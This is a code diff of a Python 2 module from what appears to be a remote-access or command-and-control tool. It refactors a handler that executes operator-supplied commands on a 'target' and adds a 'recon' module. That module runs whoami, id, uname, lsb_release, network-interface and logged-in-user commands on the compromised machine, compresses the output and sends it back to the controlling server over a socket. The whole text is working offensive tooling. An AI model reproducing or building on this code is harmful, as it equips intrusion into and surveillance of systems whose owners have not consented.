@@ -1,18 +1,21 @@
 import module
+import config as CFG
 
 import re
+import zlib
 
 REGEX = re.compile('^exec(\s+-o(\s+[\w.]+)?)?\s+(("[^"]+")\s+)+$')
-MODNAME = 'exec'
+EXEC = 'exec'
+RECON = 'recon'
 USAGE = """Execute commands on target.
 usage: exec [-o [filename]] "cmd1" ["cmd2" "cmd3" ...]
 \nExecute given commands and optionally log to file with optional filename.
 \noptions:
 -h\t\tshow help
--o filename\twrite results to file in ARCHIVE_DIR'."""
+-o filename\twrite results to file in {}/'.""".format(CFG.ARCHIVE_DIR)
 
 
-@module.server_handler(MODNAME)
+@module.server_handler(EXEC)
 def server_exec(server, argv):
     # extra space is for regex
     if len(argv) < 2 or argv[1] in ('-h', '--help') or not REGEX.match(' '.join(argv) + ' '):
@@ -26,20 +29,52 @@ def server_exec(server, argv):
     server.generic(*preproc)
 
 
-@module.client_handler(MODNAME)
-def client_shell(client, inp):
+@module.client_handler(EXEC)
+def client_exec(client, inp):
     """Handle server `exec' command.
 
     Execute specially formatted input string and return specially formatted
     response.
     """
 
+    client.s.send(execute(client, ''.join(inp.split()[1:])))
+
+
+@module.server_handler(RECON)
+def server_recon(server, argv):
+    if '-h' in argv or '--help' in argv:
+        print USAGE
+        return
+
+    argc = len(argv)
+
+    if argc == 1:
+        server.generic(RECON)
+    elif '-o' in argv:
+        if argc == 2:
+            server.generic(RECON, True)
+        elif argc == 3:
+            server.generic(RECON, True, argv[2])
+        else:
+            print USAGE
+    else:
+        print USAGE
+
+
+@module.client_handler(RECON)
+def client_recon(client, inp):
+    ipcmd = 'ip addr' if 'no' in client.cmd_exec('which ifconfig') else 'ifconfig'
+    exec_str = 'exec "whoami" "id" "uname -a" "lsb_release -a" "{}" "w" "who -a"'.format(ipcmd)
+    client.s.send(zlib.compress(execute(client, exec_str)))
+
+
+def execute(client, exec_str):
     out = ''
-    cmds = parse_exec_cmds(inp[5:])
+    cmds = parse_exec_cmds(exec_str)
     for cmd in cmds:
         cmd_out = client.cmd_exec(cmd)
         out += '='*20 + '\n\n$ {}\n{}\n'.format(cmd, cmd_out)
-    client.s.send(out)
+    return out
 
 
 def preprocess(argv):
